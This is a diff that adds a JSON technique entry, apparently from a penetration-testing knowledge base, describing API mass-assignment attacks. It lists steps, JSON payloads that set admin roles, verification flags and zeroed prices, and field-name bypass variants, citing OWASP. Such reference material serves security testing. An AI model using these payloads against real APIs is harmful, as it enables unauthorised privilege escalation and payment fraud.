@@ -1,0 +1,53 @@
+{
+  "id": "api-mass-assignment",
+  "title": "API Mass Assignment / Auto-binding",
+  "category": "api",
+  "tags": ["mass-assignment", "api", "privilege-escalation", "auto-binding"],
+  "applicability": {
+    "technologies": ["node", "python-django", "ruby-rails", "java-spring", "php-laravel"],
+    "contexts": ["api-endpoint", "json-body", "form-input", "user-registration", "profile-update"],
+    "preconditions": ["api-accepts-json", "object-binding-from-request"]
+  },
+  "technique": {
+    "summary": "Submit unexpected fields in API requests that get automatically bound to internal object properties. This can modify fields like role, isAdmin, balance, or verified that should not be user-controllable.",
+    "steps": [
+      "Identify an API endpoint that accepts JSON/form data for object creation or update",
+      "Study the normal request to understand expected fields",
+      "Review API responses, documentation, or error messages for hidden/internal field names",
+      "Add additional fields to the request: role, isAdmin, admin, verified, balance, permissions",
+      "Check if the extra fields were persisted by reading the object back",
+      "Attempt privilege escalation by setting role=admin or isAdmin=true"
+    ],
+    "payloads": [
+      {
+        "payload": "{\"username\":\"test\",\"email\":\"test@test.com\",\"password\":\"pass123\",\"role\":\"admin\"}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Add role field to registration request"
+      },
+      {
+        "payload": "{\"name\":\"Test User\",\"isAdmin\":true,\"verified\":true}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Add boolean privilege fields to profile update"
+      },
+      {
+        "payload": "{\"amount\":100,\"currency\":\"USD\",\"discount\":100,\"price\":0}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Modify pricing fields in order/transaction endpoint"
+      }
+    ],
+    "bypassTechniques": [
+      "Try different cases: Role, ROLE, isadmin, is_admin",
+      "Try nested objects: {\"user\":{\"role\":\"admin\"}}",
+      "Try array notation: user[role]=admin",
+      "Use PUT/PATCH methods which may have different binding rules than POST"
+    ]
+  },
+  "references": [
+    "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
+    "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+  ],
+  "source": "owasp"
+}
